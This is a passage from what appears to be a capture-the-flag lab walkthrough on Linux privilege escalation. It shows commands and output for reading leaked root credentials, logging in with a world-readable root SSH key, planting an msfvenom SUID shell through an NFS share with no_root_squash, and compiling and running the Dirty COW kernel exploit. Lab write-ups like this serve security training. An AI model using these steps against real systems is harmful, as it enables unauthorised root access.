    auth-user-pass /etc/openvpn/auth.txt
    comp-lzo
    verb 1
    reneg-sec 0

    user@debian:~$ cat /etc/openvpn/auth.txt
    root
    password123
    ```

- The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user# 
    ```

- What file did you find the root user's credentials in?

    ```bash
    /etc/openvpn/auth.txt
    ```

## Passwords & Keys - SSH Keys
Sometimes users make backups of important files but fail to secure them with the correct permissions.

- Look for hidden files & directories in the system root:

    ```bash
    user@debian:~$ ls -la /
    total 96
    drwxr-xr-x 22 root root  4096 Aug 25  2019 .
    drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
    drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
    drwxr-xr-x  3 root root  4096 May 12  2017 boot
    drwxr-xr-x 12 root root  2820 Feb  2 05:01 dev
    drwxr-xr-x 67 root root  4096 Feb  2 05:01 etc
    drwxr-xr-x  3 root root  4096 May 15  2017 home
    lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
    drwxr-xr-x 12 root root 12288 May 14  2017 lib
    lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
    drwx------  2 root root 16384 May 12  2017 lost+found
    drwxr-xr-x  3 root root  4096 May 12  2017 media
    drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
    drwxr-xr-x  2 root root  4096 May 12  2017 opt
    dr-xr-xr-x 97 root root     0 Feb  2 04:59 proc
    drwx------  5 root root  4096 May 15  2020 root
    drwxr-xr-x  2 root root  4096 May 13  2017 sbin
    drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
    drwxr-xr-x  2 root root  4096 May 12  2017 srv
    drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
    drwxr-xr-x 13 root root     0 Feb  2 04:59 sys
    drwxrwxrwt  2 root root  4096 Feb  2 05:06 tmp
    drwxr-xr-x 11 root root  4096 May 13  2017 usr
    drwxr-xr-x 14 root root  4096 May 13  2017 var
    lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
    ```

- Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:

    ```bash
    user@debian:~$ ls -l /.ssh
    total 4
    -rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
    ```

    Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

- Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ chmod 600 root_key
    ```

- Use the key to login to the Debian VM as the root account (change the IP accordingly):

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ ssh -i root_key root@10.10.225.64
    Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
    root@debian:~#
    ```

## NFS
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

- Check the NFS share configuration on the Debian VM:

    ```bash
    user@debian:~$ cat /etc/exports
    # /etc/exports: the access control list for filesystems which may be exported
    #               to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #

    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

    #/tmp *(rw,sync,insecure,no_subtree_check)
    ```

    Note that the `/tmp` share has root squashing disabled.

- Using Kali's root user, create a mount point on your Kali box and mount the `/tmp` share (update the IP accordingly):

    ```bash
    ┌──(root💀kali)-[/home/kali]
    └─# mkdir /tmp/nfs
                                                                                                                                                                                
    ┌──(root💀kali)-[/home/kali]
    └─# mount -o rw,vers=2 10.10.225.64:/tmp /tmp/nfs
    ```

- Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

    ```bash
    ┌──(root💀kali)-[/home/kali]
    └─# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    No encoder specified, outputting raw payload
    Payload size: 48 bytes
    Final size of elf file: 132 bytes
    Saved as: /tmp/nfs/shell.elf
    ```

- Still using Kali's root user, make the file executable and set the SUID permission:

    ```bash
    ┌──(root💀kali)-[/home/kali]
    └─# chmod +xs /tmp/nfs/shell.elf
    ```

- Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:'

    ```bash
    user@debian:~$ /tmp/shell.elf
    bash-4.1# whoami
    root
    ```

- What is the name of the option that disables root squashing?
> no_root

## Kernel Exploits
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

- Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:

    ```bash
    user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

    #############################
        Linux Exploit Suggester 2
    #############################

    Local Kernel: 2.6.32
    Searching 72 exploits...

    Possible Exploits
    [1] american-sign-language
        CVE-2010-4347
        Source: http://www.securityfocus.com/bid/45408
    [2] can_bcm
        CVE-2010-2959
        Source: http://www.exploit-db.com/exploits/14814
    [3] dirty_cow
        CVE-2016-5195
        Source: http://www.exploit-db.com/exploits/40616
    [4] exploit_x                                                                                                                                                              
        CVE-2018-14665                                                                                                                                                         
        Source: http://www.exploit-db.com/exploits/45697
    [5] half_nelson1
        Alt: econet       CVE-2010-3848
        Source: http://www.exploit-db.com/exploits/17787
    [6] half_nelson2
        Alt: econet       CVE-2010-3850
        Source: http://www.exploit-db.com/exploits/17787
    [7] half_nelson3
        Alt: econet       CVE-2010-4073
        Source: http://www.exploit-db.com/exploits/17787
    [8] msr
        CVE-2013-0268
        Source: http://www.exploit-db.com/exploits/27297
    [9] pktcdvd
        CVE-2010-3437
        Source: http://www.exploit-db.com/exploits/15150
    [10] ptrace_kmod2
        Alt: ia32syscall,robert_you_suck       CVE-2010-3301
        Source: http://www.exploit-db.com/exploits/15023
    [11] rawmodePTY
        CVE-2014-0196
        Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
    [12] rds
        CVE-2010-3904
        Source: http://www.exploit-db.com/exploits/15285
    [13] reiserfs
        CVE-2010-1146
        Source: http://www.exploit-db.com/exploits/12130
    [14] video4linux
        CVE-2010-3081
        Source: http://www.exploit-db.com/exploits/15024
    ```

    The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. It replaces the SUID file `/usr/bin/passwd` with one that spawns a shell (a backup of `/usr/bin/passwd` is made at `/tmp/bak`).

- Compile the code and run it (note that it may take several minutes to complete):

    ```bash
    user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
    user@debian:~$ ./c0w
                                    
    (___)                                   
    (o o)_____/                             
        @@ `     \                            
        \ ____, //usr/bin/passwd                          
        //    //                              
        ^^    ^^                               
    DirtyCow root privilege escalation
    Backing up /usr/bin/passwd to /tmp/bak
    mmap c45a0000

    madvise 0

    ptrace 0
    ```

- Once the exploit completes, run /usr/bin/passwd to gain a root shell:

    ```bash
    user@debian:~$ /usr/bin/passwd
    root@debian:/home/user#
    ```

## Privilege Escalation Scripts
Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: `/home/user/tools/privesc-scripts`